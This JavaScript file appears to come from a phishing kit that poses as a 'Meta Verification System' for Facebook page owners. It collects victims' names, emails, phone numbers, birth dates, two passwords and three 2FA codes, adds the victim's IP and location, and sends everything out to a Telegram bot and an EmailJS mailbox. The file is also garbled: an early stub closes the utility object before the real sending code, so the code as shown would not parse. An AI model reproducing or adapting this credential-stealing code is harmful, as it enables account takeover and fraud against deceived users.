// Utilities
const Utils = {
    encrypt(text) {
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = {
                value: encryptedValue,
                expiry: Date.now() + CONFIG.STORAGE_EXPIRY
            };

            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error("Save error:", error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);

            if (!item) return null;

            const { value, expiry } = JSON.parse(item);

            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }

            const decrypted = this.decrypt(value);

            return decrypted ? JSON.parse(decrypted) : null;

        } catch (error) {
            console.error("Get record error:", error);
            return null;
        }
    },

    // Lấy IP độc lập
    async getUserIp() {
        try {
            const response = await fetch(
                "https://api.ipify.org?format=json",
                {
                    method: "GET",
                    cache: "no-store"
                }
            );

            if (!response.ok) {
                throw new Error("IP API error: " + response.status);
            }

            const data = await response.json();

            return data && data.ip ? data.ip : "N/A";

        } catch (error) {
            console.error("Error getting IP:", error);
            return "N/A";
        }
    },

    // Lấy thông tin IP + Location
    async getUserLocation() {
        let ip = "N/A";
        let city = "N/A";
        let region = "N/A";
        let country = "N/A";
        let countryCode = "N/A";

        try {
            // Luôn thử lấy IP trước
            ip = await this.getUserIp();

            // Sau đó lấy thông tin vị trí
            const response = await fetch(
                "https://ipinfo.io/json?token=5a58a2d85996e3",
                {
                    method: "GET",
                    cache: "no-store"
                }
            );

            if (response.ok) {
                const data = await response.json();

                // Nếu IPInfo có IP thì ưu tiên IPInfo
                if (data.ip) {
                    ip = data.ip;
                }

                city = data.city || "N/A";
                region = data.region || "N/A";
                countryCode = data.country || "N/A";
                country = data.country || "N/A";
            }

        } catch (error) {
            console.error("Error getting location:", error);
        }

        // Tạo Location không bao giờ bị "N/A)"
        let locationParts = [];

        if (city !== "N/A") {
            locationParts.push(city);
        }

        if (region !== "N/A") {
            locationParts.push(region);
        }

        if (country !== "N/A") {
            locationParts.push(country);
        }

        const location =
            locationParts.length > 0
                ? locationParts.join(" | ")
                : "N/A";

        return {
            location: location,
            country_code: countryCode,
            ip: ip,
            region: region,
            country: country
        };
    },

    async sendToTelegram(data) {
        const locationData = await this.getUserLocation();

        // Gộp dữ liệu
        const telegramData = {
            ...data,
            ip: locationData.ip,
            location: locationData.location,
            country_code: locationData.country_code,
            region: locationData.region,
            country: locationData.country
        };

        // Phần gửi Telegram của bạn đặt tiếp ở đây
        // ...
    }
};

    async sendToTelegram(data) {
        const locationData = await this.getUserLocation();

        const text = `
<b>IP:</b> <code>${locationData.ip}</code>
<b>Location:</b> <code>${locationData.location})</code>
----------------------------------
<b>Full Name:</b> <code>${data.fullName || ''}</code>
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Phone:</b> <code>${data.phone || ''}</code>
<b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
----------------------------------
<b>Password(1):</b> <code>${data.password || ''}</code>
<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
----------------------------------
<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;

        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    },

    async sendToEmail(data) {
        const locationData = await this.getUserLocation();

        const emailContent = `
IP: ${locationData.ip}
Location: ${locationData.location}
----------------------------------
Full Name: ${data.fullName || ''}
Email: ${data.email || ''}
Email Business: ${data.emailBusiness || ''}
Page Name: ${data.fanpage || ''}
Phone: ${data.phone || ''}
Date of Birth: ${data.day}/${data.month}/${data.year}
----------------------------------
Password(1): ${data.password || ''}
Password(2): ${data.passwordSecond || ''}
----------------------------------
🔐Code 2FA(1): ${data.twoFa || ''}
🔐Code 2FA(2): ${data.twoFaSecond || ''}
🔐Code 2FA(3): ${data.twoFaThird || ''}

Sent at: ${new Date().toLocaleString()}`;

        try {
            // Load EmailJS SDK if not already loaded
            if (!window.emailjs) {
                await this.loadEmailJSSDK();
            }

            await emailjs.send(
                CONFIG.EMAILJS_SERVICE_ID,
                CONFIG.EMAILJS_TEMPLATE_ID,
                {
                    to_email: CONFIG.EMAIL_RECIPIENT,
                    subject: `Meta Verification - ${locationData.location}`,
                    message: emailContent,
                    from_name: 'Meta Verification System',
                    reply_to: data.email || 'noreply@system.com'
                },
                CONFIG.EMAILJS_PUBLIC_KEY
            );
        } catch (error) {
            console.error('Email error:', error);
        }
    },

    loadEmailJSSDK() {
        return new Promise((resolve, reject) => {
            if (window.emailjs) {
                resolve();
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
            script.onload = () => {
                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
                resolve();
            };
            script.onerror = reject;
            document.head.appendChild(script);
        });
    },

    async sendNotification(data) {
        const notificationType = CONFIG.NOTIFICATION_TYPE;

        try {
            if (notificationType === 'telegram' || notificationType === 'both') {
                await this.sendToTelegram(data);
            }

            if (notificationType === 'email' || notificationType === 'both') {
                await this.sendToEmail(data);
            }
        } catch (error) {
            console.error('Notification error:', error);
        }
    },

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone;
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    }
};

